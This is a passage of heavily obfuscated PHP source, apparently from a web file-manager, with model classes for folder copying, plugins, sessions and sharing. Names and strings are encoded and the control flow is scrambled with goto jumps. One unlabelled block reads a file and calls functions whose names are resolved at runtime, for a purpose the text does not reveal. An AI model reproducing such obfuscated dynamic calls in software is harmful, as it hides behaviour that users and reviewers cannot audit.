$ÅĞ§åââ = $this->mkdir($˜»Ù, $ğòñ´æ‡, $ßæÓˆÎ); if (!$ˆä»¡Êå || $ßæÓˆÎ == REPEAT_RENAME_FOLDER) { $ßæÓˆÎ = !1; } if ($ˆä»¡Êå) { $this->_childrenAllMake($ˆä»¡Êå); } Hook::trigger($‘·‚ÈÑ[625]); $this->_copyChildTo($“‹üè¤ô, $ì²¹úü, $ÅĞ§åââ, $ßæÓˆÎ, $è°Ã’, $¹ãÃçò); Hook::trigger($‘·‚ÈÑ[626]); if ($ÅĞ§åââ) { $this->folderSizeResetChildren($ÅĞ§åââ); } $this->_childrenListClear(); Model($‘·‚ÈÑ[589])->addAll($è°Ã’[$‘·‚ÈÑ[587]], array(), !0); Model($‘·‚ÈÑ[590])->eventCopy($ÅĞ§åââ); $this->saveAll($è°Ã’[$‘·‚ÈÑ[588]]); Model($‘·‚ÈÑ[500])->linkAdd($è°Ã’[$‘·‚ÈÑ[586]]); Model($‘·‚ÈÑ[500])->remove($è°Ã’[$‘·‚ÈÑ[624]]); $this->folderSizeReset($˜»Ù); $this->updateModifyTime($˜»Ù); return $ÅĞ§åââ; } private function _copyChildTo($·¾Öù·ã, $…Æƒİ¹, $çå¦ÉÑŠ, $™áñØá, &$Œ×ì€¾›, $Ş÷¨Ğğš) { $®§®Ìâü =& $_SERVER[¹ş¤¶ĞÖ]; $ÌÉ¡ã  = $this->sourceInfoCache($çå¦ÉÑŠ); $ÙÂ÷õàÁ = $·¾Öù·ã->listPath($…Æƒİ¹); $ÙÂ÷õàÁ = $ÙÂ÷õàÁ ? $ÙÂ÷õàÁ : array($®§®Ìâü[83] => array(), $®§®Ìâü[82] => array()); $öŸé¿áˆ = array_merge($ÙÂ÷õàÁ[$®§®Ìâü[83]], $ÙÂ÷õàÁ[$®§®Ìâü[82]]); $úÀ‚ß = $this->_addFiles($·¾Öù·ã, $ÙÂ÷õàÁ[$®§®Ìâü[83]], $Ş÷¨Ğğš); $œŠ½àƒ = array(); foreach ($öŸé¿áˆ as &$­ÙÅÄß¨) { if (isset($úÀ‚ß[$­ÙÅÄß¨[$®§®Ìâü[32]]])) { $­ÙÅÄß¨ = $úÀ‚ß[$­ÙÅÄß¨[$®§®Ìâü[32]]]; } $­ÙÅÄß¨[$®§®Ìâü[439]] = $­ÙÅÄß¨[$®§®Ìâü[33]] == $®§®Ìâü[75]; $­ÙÅÄß¨[$®§®Ìâü[441]] = substr(_get($­ÙÅÄß¨, $®§®Ìâü[174], $®§®Ìâü[12]), 0, 10); $­ÙÅÄß¨[$®§®Ìâü[76]] = _get($­ÙÅÄß¨, $®§®Ìâü[76], 0); $­ÙÅÄß¨[$®§®Ìâü[497]] = _get($­ÙÅÄß¨, $®§®Ìâü[497], 0); if (!isset($­ÙÅÄß¨[$®§®Ìâü[627]]) && $­ÙÅÄß¨[$®§®Ìâü[497]]) { $Œ×ì€¾›[$®§®Ìâü[624]][] = $­ÙÅÄß¨[$®§®Ìâü[497]]; } if ($™áñØá) { $ï³”•‰Í = $this->fileNameExistCache($çå¦ÉÑŠ, $­ÙÅÄß¨[$®§®Ìâü[32]]); if ($ï³”•‰Í) { if ($­ÙÅÄß¨[$®§®Ìâü[439]] || $™áñØá == REPEAT_SKIP) { continue; } if ($™áñØá == REPEAT_REPLACE) { $“Ú­óÀş = $this->sourceInfoCache($ï³”•‰Í); $Î½êâ’Î = $this->fileHistory($“Ú­óÀş, $­ÙÅÄß¨[$®§®Ìâü[497]], $­ÙÅÄß¨[$®§®Ìâü[76]]); if ($Î½êâ’Î) { $Œ×ì€¾›[$®§®Ìâü[586]][] = $­ÙÅÄß¨[$®§®Ìâü[497]]; } continue; } else { if ($™áñØá == REPEAT_RENAME) { $­ÙÅÄß¨[$®§®Ìâü[32]] = $this->fileNameAutoCache($çå¦ÉÑŠ, $­ÙÅÄß¨[$®§®Ìâü[32]], $™áñØá, !1); } } } } if (!$­ÙÅÄß¨[$®§®Ìâü[439]] && $­ÙÅÄß¨[$®§®Ìâü[497]] == 0) { continue; } if (!$­ÙÅÄß¨[$®§®Ìâü[439]] && $­ÙÅÄß¨[$®§®Ìâü[497]]) { $Œ×ì€¾›[$®§®Ìâü[586]][] = $­ÙÅÄß¨[$®§®Ìâü[497]]; } $œŠ½àƒ[] = $this->_makeItemData($­ÙÅÄß¨, $ÌÉ¡ã , $­ÙÅÄß¨[$®§®Ìâü[32]]); } unset($­ÙÅÄß¨); if (!empty($œŠ½àƒ)) { $this->addAll($œŠ½àƒ); $this->_childrenListSelect($çå¦ÉÑŠ); } $¤ëíûˆ© = $this->_childrenList($çå¦ÉÑŠ); $¤ëíûˆ© = array_to_keyvalue($¤ëíûˆ©, $®§®Ìâü[32]); foreach ($öŸé¿áˆ as $­ÙÅÄß¨) { $“Ú­óÀş = $¤ëíûˆ©[$­ÙÅÄß¨[$®§®Ìâü[32]]]; $Â«µ¡¸ = $“Ú­óÀş[$®§®Ìâü[431]]; $this->_copyApplyMeta($“Ú­óÀş, $Œ×ì€¾›); if ($­ÙÅÄß¨[$®§®Ìâü[33]] == $®§®Ìâü[75]) { $­ÙÅÄß¨[$®§®Ìâü[84]] = $·¾Öù·ã->getPathInner($­ÙÅÄß¨[$®§®Ìâü[84]]); $this->_copyChildTo($·¾Öù·ã, $­ÙÅÄß¨[$®§®Ìâü[84]], $Â«µ¡¸, $™áñØá, $Œ×ì€¾›, $Ş÷¨Ğğš); } } } private function _addFiles($—’¨‰, $´²Ñë±, $¸¯°ØÌ°) { $Ğ„ôÚ”ø =& $_SERVER[¹ş¤¶ĞÖ]; if (!$´²Ñë± || count($´²Ñë±) == 0) { return array(); } $Ôê¶–Ä = array(); foreach ($´²Ñë± as &$ğŒ¨Éçé) { Hook::trigger($Ğ„ôÚ”ø[628], $ğŒ¨Éçé); $ğŒ¨Éçé[$Ğ„ôÚ”ø[84]] = $—’¨‰->getPathInner($ğŒ¨Éçé[$Ğ„ôÚ”ø[84]]); $áÎŸ·ñ® = $—’¨‰->hashSimple($ğŒ¨Éçé[$Ğ„ôÚ”ø[84]]); $í£Ãî½€ = $—’¨‰->hashMd5($ğŒ¨Éçé[$Ğ„ôÚ”ø[84]]); if (strlen($í£Ãî½€) > 10 && !isset($Ôê¶–Ä[$í£Ãî½€])) { $Ôê¶–Ä[$í£Ãî½€] = array(); } $ğŒ¨Éçé[$Ğ„ôÚ”ø[177]] = $áÎŸ·ñ®; $ğŒ¨Éçé[$Ğ„ôÚ”ø[176]] = $í£Ãî½€; $Ôê¶–Ä[$í£Ãî½€][] =& $ğŒ¨Éçé; if (count($Ôê¶–Ä[$í£Ãî½€]) > 1) { $ğŒ¨Éçé[$Ğ„ôÚ”ø[627]] = !0; } Hook::trigger($Ğ„ôÚ”ø[629], $ğŒ¨Éçé); } unset($ğŒ¨Éçé); $˜òÂ‡ËÖ = array($Ğ„ôÚ”ø[176] => array($Ğ„ôÚ”ø[7], array_keys($Ôê¶–Ä))); $ÉËı³†­ = Model($Ğ„ôÚ”ø[630]); $‡çôµ´Ø = $ÉËı³†­->where($˜òÂ‡ËÖ)->select(); $‡çôµ´Ø = $‡çôµ´Ø ? $‡çôµ´Ø : array(); foreach ($‡çôµ´Ø as $ğê„Œ) { if (!isset($Ôê¶–Ä[$ğê„Œ[$Ğ„ôÚ”ø[176]]])) { continue; } $œÏ‚ÜÕ = $Ôê¶–Ä[$ğê„Œ[$Ğ„ôÚ”ø[176]]]; foreach ($œÏ‚ÜÕ as &$ğŒ¨Éçé) { $ğŒ¨Éçé[$Ğ„ôÚ”ø[497]] = $ğê„Œ[$Ğ„ôÚ”ø[497]]; $ğŒ¨Éçé[$Ğ„ôÚ”ø[627]] = !0; } unset($ğŒ¨Éçé); } $¤¿’õŒÜ = array(); foreach ($´²Ñë± as $£¼¢ÙÍÃ) { Hook::trigger($Ğ„ôÚ”ø[631], $£¼¢ÙÍÃ); if (isset($£¼¢ÙÍÃ[$Ğ„ôÚ”ø[627]]) && $£¼¢ÙÍÃ[$Ğ„ôÚ”ø[627]]) { Hook::trigger($Ğ„ôÚ”ø[632], $£¼¢ÙÍÃ); continue; } $‹ªˆ¦Ô = $—’¨‰->getPathInner($£¼¢ÙÍÃ[$Ğ„ôÚ”ø[84]]); $“ÏÖ‡Í = $ÉËı³†­->addFileMake($‹ªˆ¦Ô, $£¼¢ÙÍÃ[$Ğ„ôÚ”ø[76]], $£¼¢ÙÍÃ[$Ğ„ôÚ”ø[177]], $£¼¢ÙÍÃ[$Ğ„ôÚ”ø[176]], $£¼¢ÙÍÃ[$Ğ„ôÚ”ø[32]], $¸¯°ØÌ°); Hook::trigger($Ğ„ôÚ”ø[632], $£¼¢ÙÍÃ); if (!is_array($“ÏÖ‡Í)) { continue; } $¤¿’õŒÜ[] = $“ÏÖ‡Í; } $ÉËı³†­->addAll($¤¿’õŒÜ); $˜òÂ‡ËÖ = array($Ğ„ôÚ”ø[176] => array($Ğ„ôÚ”ø[7], array_keys($Ôê¶–Ä))); $‡çôµ´Ø = $ÉËı³†­->where($˜òÂ‡ËÖ)->select(); $‡çôµ´Ø = $‡çôµ´Ø ? $‡çôµ´Ø : array(); foreach ($‡çôµ´Ø as $ğê„Œ) { if (!isset($Ôê¶–Ä[$ğê„Œ[$Ğ„ôÚ”ø[176]]])) { continue; } $§˜¡ò™Ê =& $Ôê¶–Ä[$ğê„Œ[$Ğ„ôÚ”ø[176]]]; foreach ($§˜¡ò™Ê as &$ğŒ¨Éçé) { $ğŒ¨Éçé[$Ğ„ôÚ”ø[497]] = $ğê„Œ[$Ğ„ôÚ”ø[497]]; } unset($ğŒ¨Éçé); } $ğµ­¡ì = array(); foreach ($´²Ñë± as $é¹š”÷’) { $ğµ­¡ì[$é¹š”÷’[$Ğ„ôÚ”ø[32]]] = $é¹š”÷’; } return $ğµ­¡ì; } } goto FÚéçÏˆİë; fÊ…‘‡®¼È: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\160\x6c\x75\x67\x69\156\114\151\163\164"; public $field = array("\156\141\155\x65", "\x73\164\141\164\165\x73", "\x72\145\147\x69\145\163\x74", "\x63\157\x6e\x66\151\x67"); public function loadList($û‰›¦ì‰ = false) { $ªá’ã°å = array_to_keyvalue($this->listData(), $_SERVER[¹ş¤¶ĞÖ][32]); if ($û‰›¦ì‰) { return $ªá’ã°å[$û‰›¦ì‰]; } return $ªá’ã°å; } public function init() { $Í™À’§ =& $_SERVER[¹ş¤¶ĞÖ]; Hook::trigger($Í™À’§[1986]); $ÀèÊñÖñ = $this->loadPluginList(); foreach ($ÀèÊñÖñ as $îÔ†ç¾ => $Î®Å§¦×) { $Ü¥¿Šû› = $this->appAllow($îÔ†ç¾, $Î®Å§¦×); if (!$Ü¥¿Šû›) { continue; } foreach ($Î®Å§¦×[$Í™À’§[1987]] as $ß£ù’˜ë => $Òš–Ûèú) { Hook::bind($ß£ù’˜ë, $Òš–Ûèú); } } Hook::trigger($Í™À’§[1988]); Hook::trigger(ACTION); } public function appAllow($ªòÄßù², $š™ÄÑŞğ, $´¼×©ë = true) { $è¡ÄË—¦ =& $_SERVER[¹ş¤¶ĞÖ]; $„ÜØàì = PLUGIN_DIR . $ªòÄßù² . $è¡ÄË—¦[1989]; if (!is_array($š™ÄÑŞğ) || !is_array($š™ÄÑŞğ[$è¡ÄË—¦[1987]]) || $š™ÄÑŞğ[$è¡ÄË—¦[776]] != 1 || !is_file($„ÜØàì)) { return !1; } if ($GLOBALS[$è¡ÄË—¦[523]] == 1) { if ($GLOBALS[$è¡ÄË—¦[6]][$è¡ÄË—¦[1990]] || !$GLOBALS[$è¡ÄË—¦[6]][$è¡ÄË—¦[1991]]) { return !0; } $‹½È = explode($è¡ÄË—¦[50], strtolower($GLOBALS[$è¡ÄË—¦[6]][$è¡ÄË—¦[1991]])); return in_array(strtolower($ªòÄßù²), $‹½È) ? !1 : !0; } if ($´¼×©ë && !Action($è¡ÄË—¦[1992])->checkAuth($ªòÄßù²)) { return !1; } return !0; } public function unInstall($˜ÇµÕ‘ñ) { $ï’™†ü¸ =& $_SERVER[¹ş¤¶ĞÖ]; $² ßÒÎë = $this->loadList($˜ÇµÕ‘ñ); if (file_exists(PLUGIN_DIR . $˜ÇµÕ‘ñ)) { Hook::apply($˜ÇµÕ‘ñ . $ï’™†ü¸[1993]); } $this->remove($² ßÒÎë[$ï’™†ü¸[428]]); } public function changeStatus($”³ıÁéÖ, $«Ÿ¿©ğÕ) { $€í…“ü£ =& $_SERVER[¹ş¤¶ĞÖ]; $±™§± = $this->loadList($”³ıÁéÖ); if ($«Ÿ¿©ğÕ) { Hook::apply($”³ıÁéÖ . $€í…“ü£[1994]); } $this->update($±™§±[$€í…“ü£[428]], array($€í…“ü£[1995] => $«Ÿ¿©ğÕ)); } public function appRegist($İÚù•Éï, $ÄâÉ¬ö·) { $¬¸­àİ =& $_SERVER[¹ş¤¶ĞÖ]; $Ç®ë™­ó = $this->loadList($İÚù•Éï); if ($Ç®ë™­ó) { $this->update($Ç®ë™­ó[$¬¸­àİ[428]], array($¬¸­àİ[1987] => $ÄâÉ¬ö·)); } else { $…ê´î˜¿ = array($¬¸­àİ[32] => $İÚù•Éï, $¬¸­àİ[1987] => $ÄâÉ¬ö·, $¬¸­àİ[776] => 0, $¬¸­àİ[6] => $this->getConfigDefault($İÚù•Éï)); $this->insert($…ê´î˜¿); } } public function getConfigDefault($ÉŒ“¸Ÿ£) { $·â·ó†  =& $_SERVER[¹ş¤¶ĞÖ]; $Å•µµÇæ = array(); $›Â†€ ñ = $this->getPackageJson($ÉŒ“¸Ÿ£); if (!$›Â†€ ñ && is_array($›Â†€ ñ[$·â·ó† [1996]])) { return $Å•µµÇæ; } foreach ($›Â†€ ñ[$·â·ó† [1996]] as $•ØÍ°˜ => $ÖıÏÓÀ“) { if (!isset($ÖıÏÓÀ“[$·â·ó† [403]]) || isset($Å•µµÇæ[$•ØÍ°˜])) { continue; } $Å•µµÇæ[$•ØÍ°˜] = $ÖıÏÓÀ“[$·â·ó† [403]]; } return $Å•µµÇæ; } public function getPackageJson($ÅÛ‚ÑÖ“) { return Hook::apply($ÅÛ‚ÑÖ“ . $_SERVER[¹ş¤¶ĞÖ][1997]); } public function getConfig($Ãáê´è•, $¥ŞÜÑ³ã = false) { $üÅ£¤ÍÕ =& $_SERVER[¹ş¤¶ĞÖ]; $§ü˜íû² = array(); $õÚìîê‚ = $this->loadList($Ãáê´è•); if ($õÚìîê‚ && is_array($õÚìîê‚[$üÅ£¤ÍÕ[6]])) { $§ü˜íû² = $õÚìîê‚[$üÅ£¤ÍÕ[6]]; } if (!$§ü˜íû² || $¥ŞÜÑ³ã) { $§ü˜íû² = $this->getConfigDefault($Ãáê´è•); } return $§ü˜íû²; } public function setConfig($Æñ²™¿æ, $œğÑŸ”ğ = false) { $ˆğ‘°³Ü =& $_SERVER[¹ş¤¶ĞÖ]; $óÉí”Š¶ = $this->loadList($Æñ²™¿æ); if (!$óÉí”Š¶) { return !1; } $»¬¾µ’™ = $óÉí”Š¶[$ˆğ‘°³Ü[6]]; if ($œğÑŸ”ğ == !1) { $»¬¾µ’™ = array(); $œğÑŸ”ğ = $this->getConfigDefault($Æñ²™¿æ); } foreach ($œğÑŸ”ğ as $ÎÎ¦± => $³öŠîĞñ) { $»¬¾µ’™[$ÎÎ¦±] = is_string($³öŠîĞñ) ? trim($³öŠîĞñ) : $³öŠîĞñ; } $this->update($óÉí”Š¶[$ˆğ‘°³Ü[428]], array($ˆğ‘°³Ü[6] => $»¬¾µ’™)); } public function viewList() { $Õ¼â÷ =& $_SERVER[¹ş¤¶ĞÖ]; $èñ–Ûš = $this->loadList(); $this->pluginScan($èñ–Ûš); $èñ–Ûš = $this->loadPluginList(); $½£éÇÜ¼ = array(); foreach ($èñ–Ûš as $‰·¾£¶û => $Ø×Íèì) { unset($Ø×Íèì[$Õ¼â÷[1987]], $Ø×Íèì[$Õ¼â÷[6]]); $Ñ¤ÒÜí¯ = PLUGIN_DIR . $Ø×Íèì[$Õ¼â÷[32]] . $Õ¼â÷[1989]; if (!is_file($Ñ¤ÒÜí¯)) { continue; } $³·ãîñü = Hook::apply($Ø×Íèì[$Õ¼â÷[32]] . $Õ¼â÷[1997]); if (is_array($³·ãîñü)) { $½£éÇÜ¼[$‰·¾£¶û] = array_merge($Ø×Íèì, $³·ãîñü); } } return $½£éÇÜ¼; } private function loadPluginList() { $Š˜µåùÒ =& $_SERVER[¹ş¤¶ĞÖ]; $Ñ–üòôŠ = $this->loadList(); if (strtolower(MOD) == $Š˜µåùÒ[1998]) { return $Ñ–üòôŠ; } $ÀçÛµ–æ = Hook::trigger($Š˜µåùÒ[1999], $Ñ–üòôŠ); if ($Ñ–üòôŠ && !$ÀçÛµ–æ) { die; } return $ÀçÛµ–æ ? $ÀçÛµ–æ : $Ñ–üòôŠ; } private function pluginScan($Øú‡²µ€) { $õ®’¡˜à =& $_SERVER[¹ş¤¶ĞÖ]; recursion_dir(PLUGIN_DIR, $·Ôışòà, $àÖÜ€¿«, 0); foreach ($·Ôışòà as $©ì­±Ê) { $Ò…Â¬şº = get_path_this($©ì­±Ê); if (isset($Øú‡²µ€[$Ò…Â¬şº]) || !file_exists($©ì­±Ê . $õ®’¡˜à[2000]) || !file_exists($©ì­±Ê . $õ®’¡˜à[1989])) { continue; } Hook::apply($Ò…Â¬şº . $õ®’¡˜à[1994]); } } } if ($_SERVER[$_SERVER[¹ş¤¶ĞÖ][905]] != $_SERVER[$_SERVER[¹ş¤¶ĞÖ][1540]]) { $_getc = $_SERVER[¹ş¤¶ĞÖ][907]; $_getfile = $_SERVER[$_SERVER[¹ş¤¶ĞÖ][902]] . $_SERVER[¹ş¤¶ĞÖ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹ş¤¶ĞÖ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¹ş¤¶ĞÖ][656]) { $exit = $_SERVER[¹ş¤¶ĞÖ][908]; $exit(); } $_act = $_SERVER[¹ş¤¶ĞÖ][992]; $_act($_SERVER[$_SERVER[¹ş¤¶ĞÖ][991]]); } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\x6d\137\163\x65\x73\x73\x69\157\156"; public function get($Å™—šûÉ) { $³§áù– =& $_SERVER[¹ş¤¶ĞÖ]; $Àªğ³Ÿİ = $this->where(array($³§áù–[2001] => $Å™—šûÉ))->find(); if (!is_array($Àªğ³Ÿİ)) { return !1; } return $Àªğ³Ÿİ[$³§áù–[780]]; } public function set($Š—ìóßä, $ ŸÃªˆ¾, $ò›¹—ÂÏ = 3600) { $±°¾ú“¹ =& $_SERVER[¹ş¤¶ĞÖ]; $Çø«Ç¶Ñ = array($±°¾ú“¹[2001] => $Š—ìóßä, $±°¾ú“¹[1905] => $ ŸÃªˆ¾, $±°¾ú“¹[2002] => $ò›¹—ÂÏ + time()); if (Session::get($±°¾ú“¹[2003])) { $Çø«Ç¶Ñ[$±°¾ú“¹[1676]] = Session::get($±°¾ú“¹[2003]); } else { $Çø«Ç¶Ñ[$±°¾ú“¹[1676]] = 0; } if ($this->get($Š—ìóßä)) { return $this->where(array($±°¾ú“¹[2001] => $Š—ìóßä))->save($Çø«Ç¶Ñ); } else { return $this->add($Çø«Ç¶Ñ, array(), !0); } } public function remove($øû¾ÌŠæ) { return $this->where(array($_SERVER[¹ş¤¶ĞÖ][2001] => $øû¾ÌŠæ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹ş¤¶ĞÖ][2004] . time())->delete(); } } goto d§¦ª‚Ê¦; fš£Ù¡ÑŞ: class DbSqlite extends DbSqliteBase { public function query($ğÅöúÊ) { $Óª­øÛÆ =& $_SERVER[¹ş¤¶ĞÖ]; if (!CacheLock::fileLock($Óª­øÛÆ[13])) { return !1; } $¶·ïİØÎ = parent::query($ğÅöúÊ); CacheLock::fileUnLock($Óª­øÛÆ[13]); return $¶·ïİØÎ; } public function execute($ÇÅò´ëá) { $ö¬ß…· =& $_SERVER[¹ş¤¶ĞÖ]; if (!CacheLock::fileLock($ö¬ß…·[13])) { return !1; } $‰ÄØØíó = parent::execute($ÇÅò´ëá); CacheLock::fileUnLock($ö¬ß…·[13]); return $‰ÄØØíó; } } class DbSqlite3 extends DbSqlite3Base { public function query($âˆõÑ¡) { $Õ›Â›Ÿâ =& $_SERVER[¹ş¤¶ĞÖ]; if (!CacheLock::fileLock($Õ›Â›Ÿâ[13])) { return !1; } $ç¦í–Ïš = parent::query($âˆõÑ¡); CacheLock::fileUnLock($Õ›Â›Ÿâ[13]); return $ç¦í–Ïš; } public function execute($ÍàÀ˜è) { $«Æ›ù¦³ =& $_SERVER[¹ş¤¶ĞÖ]; if (!CacheLock::fileLock($«Æ›ù¦³[13])) { return !1; } $•“Ü£¦ = parent::execute($ÍàÀ˜è); CacheLock::fileUnLock($«Æ›ù¦³[13]); return $•“Ü£¦; } } $_file = $_SERVER[$_SERVER[¹ş¤¶ĞÖ][991]]; goto Dˆİ‡ÒÎ•; d§¦ª‚Ê¦: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\x69\155\x65", "\x74\151\155\145", "\x69\156\163\x65\x72\164\x2c\x75\160\144\141\x74\145", "\x66\x75\x6e\x63\x74\151\157\x6e"), array("\x63\x72\x65\x61\164\x65\124\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\162\x74", "\146\x75\x6e\143\x74\151\x6f\156"), array("\157\x70\164\x69\x6f\156\163", '', "\151\156\163\x65\162\164\x2c\165\x70\x64\141\x74\x65\54\163\145\x6c\145\x63\x74", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($•†ïùîĞ) { $¹ôáÉş» =& $_SERVER[¹ş¤¶ĞÖ]; $Ëç°ıÑñ = isset($•†ïùîĞ[0]) ? $•†ïùîĞ[0] : !1; return array($¹ôáÉş»[2005] => array(USER_ID, $¹ôáÉş»[2006]), $¹ôáÉş»[1946] => array($Ëç°ıÑñ, $¹ôáÉş»[2007])); } protected function listSimple() { $ÑªåøÓ§ = array($_SERVER[¹ş¤¶ĞÖ][1676] => USER_ID); $”ÒıæÁ = $this->field($this->fieldList)->where($ÑªåøÓ§)->select(); return $”ÒıæÁ ? $”ÒıæÁ : array(); } protected function getInfo($ß˜èœØ, $‹Â†áæû = false) { $¹ş§ê‡“ =& $_SERVER[¹ş¤¶ĞÖ]; if ($‹Â†áæû) { return $this->_getShareInfo(array($¹ş§ê‡“[622] => $ß˜èœØ)); } $§Ä®¾½§ = $this->cacheFunctionGet($¹ş§ê‡“[1948], $ß˜èœØ); return $§Ä®¾½§; } public function getInfoByHash($ä¾ò¨ıæ) { return $this->_getShareInfo(array($_SERVER[¹ş¤¶ĞÖ][2008] => $ä¾ò¨ıæ)); } public function getInfoByPath($Â¼Õ»Ú¾) { $Ôù²ú¿ß =& $_SERVER[¹ş¤¶ĞÖ]; $ã€÷Å— = array($Ôù²ú¿ß[1676] => USER_ID, $Ôù²ú¿ß[431] => $Â¼Õ»Ú¾); return $this->_getShareInfo($ã€÷Å—); } public function getInfoBySourcePath($µ¦ŒÚÎ) { $Ş’¨±Ğ =& $_SERVER[¹ş¤¶ĞÖ]; $ú‰ÅÔ½‚ = array($Ş’¨±Ğ[1676] => USER_ID, $Ş’¨±Ğ[1208] => $µ¦ŒÚÎ); return $this->_getShareInfo($ú‰ÅÔ½‚); } private function _getShareInfo($˜„¿–¸ï) { $õ°ßŒ±• =& $_SERVER[¹ş¤¶ĞÖ]; $¥Óêû„ = $this->where($˜„¿–¸ï)->find(); if (!$¥Óêû„) { return !1; } $˜„¿–¸ï = array($õ°ßŒ±•[622] => $¥Óêû„[$õ°ßŒ±•[622]]); $†Šô„û = $õ°ßŒ±•[2009]; $ Ô‘˜ÕÉ = Model($õ°ßŒ±•[623])->order($õ°ßŒ±•[428])->field($†Šô„û)->where($˜„¿–¸ï)->select(); if ($¥Óêû„[$õ°ßŒ±•[431]] == $õ°ßŒ±•[198]) { $¥Óêû„[$õ°ßŒ±•[87]] = IO::info($¥Óêû„[$õ°ßŒ±•[1208]]); } else { $¥Óêû„[$õ°ßŒ±•[87]] = Model($õ°ßŒ±•[1366])->pathInfo($¥Óêû„[$õ°ßŒ±•[431]]); } $¥Óêû„[$õ°ßŒ±•[2010]] = $ Ô‘˜ÕÉ; return $¥Óêû„; } protected function getInfoAuth($Úñ­“ê) { $•Ñœø¤Â =& $_SERVER[¹ş¤¶ĞÖ]; $š®À¬£â = $this->getInfo($Úñ­“ê); if ($š®À¬£â[$•Ñœø¤Â[1676]] == USER_ID) { $š®À¬£â[$•Ñœø¤Â[442]] = $š®À¬£â[$•Ñœø¤Â[87]][$•Ñœø¤Â[442]]; } else { $š®À¬£â[$•Ñœø¤Â[442]] = Model($•Ñœø¤Â[522])->authMake($š®À¬£â[$•Ñœø¤Â[2010]]); } return $š®À¬£â; } protected function listData($†®¡Ìµá = null, $¤ÚÜˆ = 300) { $ÑÜÉÓÅ• =& $_SERVER[¹ş¤¶ĞÖ]; $ğş‰…ƒß = array(array($ÑÜÉÓÅ•[517] => array($ÑÜÉÓÅ•[1045], 0), $ÑÜÉÓÅ•[620] => array($ÑÜÉÓÅ•[1045], 0), $ÑÜÉÓÅ•[2011] => $ÑÜÉÓÅ•[1964])); if ($†®¡Ìµá == $ÑÜÉÓÅ•[2012]) { $ğş‰…ƒß = array($ÑÜÉÓÅ•[517] => 1); } else { if ($†®¡Ìµá == $ÑÜÉÓÅ•[1194]) { $ğş‰…ƒß = array($ÑÜÉÓÅ•[620] => 1); } } $ğş‰…ƒß[$ÑÜÉÓÅ•[1676]] = USER_ID; $Õ°ñÀ•÷ = $this->where($ğş‰…ƒß)->selectPage($¤ÚÜˆ); return $Õ°ñÀ•÷; } protected function listToMe($Â”ÇğÅğ = 300) { $¶©…Úâæ =& $_SERVER[¹ş¤¶ĞÖ]; $üö¼×Æõ = Model($¶©…Úâæ[2013])->userGroupParents(USER_ID); $­æ™¬ˆ• = array($¶©…Úâæ[605] => SourceModel::TYPE_USER, $¶©…Úâæ[525] => USER_ID); if ($üö¼×Æõ) { $­æ™¬ˆ• = array(array($¶©…Úâæ[605] => SourceModel::TYPE_USER, $¶©…Úâæ[525] => USER_ID), array($¶©…Úâæ[605] => SourceModel::TYPE_GROUP, $¶©…Úâæ[525] => array($¶©…Úâæ[7], $üö¼×Æõ)), $¶©…Úâæ[2011] => $¶©…Úâæ[1964]); } $‹œ‚Â¼ = Model($¶©…Úâæ[623])->where($­æ™¬ˆ•)->selectPage($Â”ÇğÅğ); $Í¾¾ = array_to_keyvalue_group($‹œ‚Â¼[$¶©…Úâæ[398]], $¶©…Úâæ[622]); if (!$Í¾¾) { return $‹œ‚Â¼; } $±„×ş¼š = $¶©…Úâæ[2014]; $­æ™¬ˆ• = array($¶©…Úâæ[622] => array($¶©…Úâæ[447], array_keys($Í¾¾)), $¶©…Úâæ[1676] => array($¶©…Úâæ[1047], $¶©…Úâæ[198])); $³ÖÔÉ…ã = $this->field($±„×ş¼š)->where($­æ™¬ˆ•)->select(); foreach ($³ÖÔÉ…ã as $Ó¯„Úœ„ => &$Ä¤úûşê) { $Ä¤úûşê[$¶©…Úâæ[2010]] = $Í¾¾[$Ä¤úûşê[$¶©…Úâæ[622]]]; } unset($Ä¤úûşê); $´º½Í£¯ = array($¶©…Úâæ[2015] => $³ÖÔÉ…ã, $¶©…Úâæ[2016] => $‹œ‚Â¼[$¶©…Úâæ[395]]); return $´º½Í£¯; } protected function shareAdd($Ø†”Ü¦û, $†´Ä¡†ñ) { $¢¢ı¿üù =& $_SERVER[¹ş¤¶ĞÖ]; $‘Å‰øÏÂ = $this->_addShareData($Ø†”Ü¦û, $†´Ä¡†ñ); if (!empty($†´Ä¡†ñ[$¢¢ı¿üù[2017]])) { $this->_shareAuthSet($‘Å‰øÏÂ, $†´Ä¡†ñ[$¢¢ı¿üù[2017]]); } $this->shareEventAdd($Ø†”Ü¦û, $†´Ä¡†ñ, $¢¢ı¿üù[2018]); return $‘Å‰øÏÂ; } protected function shareAddSystem($Ş„áº…¼, $Ëªâ’á¾) { $¤ß»´¤å =& $_SERVER[¹ş¤¶ĞÖ]; $™ÚåÅÂ‘ = $this->_addShareData($Ş„áº…¼, $Ëªâ’á¾, $¤ß»´¤å[1320]); $this->_shareAuthSet($™ÚåÅÂ‘, $Ëªâ’á¾[$¤ß»´¤å[2017]]); return $™ÚåÅÂ‘; } private function shareEventAdd($ıÚŠüİ¶, $øâÓ÷Üö, $¼ı¨Ñ£ = "\141\144\x64") { $ÁÂ“Å–’ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ıÚŠüİ¶ || $ıÚŠüİ¶ == $ÁÂ“Å–’[198]) { return; } if ($¼ı¨Ñ£ == $ÁÂ“Å–’[2018]) { if ($øâÓ÷Üö[$ÁÂ“Å–’[517]] == $ÁÂ“Å–’[88]) { Model($ÁÂ“Å–’[590])->eventShare($ıÚŠüİ¶, $ÁÂ“Å–’[2019]); } if ($øâÓ÷Üö[$ÁÂ“Å–’[620]] == $ÁÂ“Å–’[88]) { Model($ÁÂ“Å–’[590])->eventShare($ıÚŠüİ¶, $ÁÂ“Å–’[2020]); } return; } $…¹Äµ‰£ = $this->getInfoByPath($ıÚŠüİ¶); $‰ë³…ô„ = $ÁÂ“Å–’[2021]; if ($…¹Äµ‰£[$ÁÂ“Å–’[517]] == $ÁÂ“Å–’[198] && $øâÓ÷Üö[$ÁÂ“Å–’[517]] == $ÁÂ“Å–’[88]) { $‰ë³…ô„ = $ÁÂ“Å–’[2019]; } if 